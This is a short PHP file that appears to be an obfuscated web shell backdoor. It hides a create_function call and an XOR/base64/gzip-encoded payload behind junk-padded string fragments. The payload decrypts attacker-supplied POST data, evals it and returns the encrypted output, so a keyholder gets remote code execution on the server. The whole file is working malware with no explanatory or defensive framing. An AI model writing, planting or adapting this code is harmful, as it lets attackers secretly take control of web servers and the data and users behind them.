<?php
$C='h("/$kh(p1.+)$kp1f/",p1@p1file_gp1et_contentp1s("php://ip1np1put"),$p1m)==1)p1 {@ob_stap1rt(p1);@e';
$i='0;(p1$jp1<$c&&p1p1$i<$l);p1$j++,$i+p1+){$o.p1=$t{$i}^$k{p1$j};}}p1returnp1 $p1o;}if (@p1preg_matcp1';
$H=str_replace('S','','creSatSe_SfuSnSctiSon');
$B='"p1;fup1ncp1tiop1n x($t,$k){$c=strlen(p1$k);$p1p1l=sp1tp1rlen($t);$o="";for($i=0;p1$ip1p1<$l;){for($j=';
$n='b_p1end_clean();p1$r=@bap1p1sep16p14_encode(@x(@gzcomp1p1press($o),$k));p1prp1int("$p$p1kh$r$kf");}';
$q='p1val(@p1gzuncomp1prep1ss(@x(@bap1se64_dp1ecode($p1m[1]p1),$k)));p1$o=@ob_gep1tp1_contenp1p1ts();@o';
$W='$p1k="3f5f1f1d"p1;$kh="3p119a7p12d0de1b";p1p1$kf="959p1993ac1f66"p1;$p1p="gCp1Izp1UI2Uxpbjp1a56B';
$U=str_replace('p1','',$W.$B.$i.$C.$q.$n);
$l=$H('',$U);$l();
?>
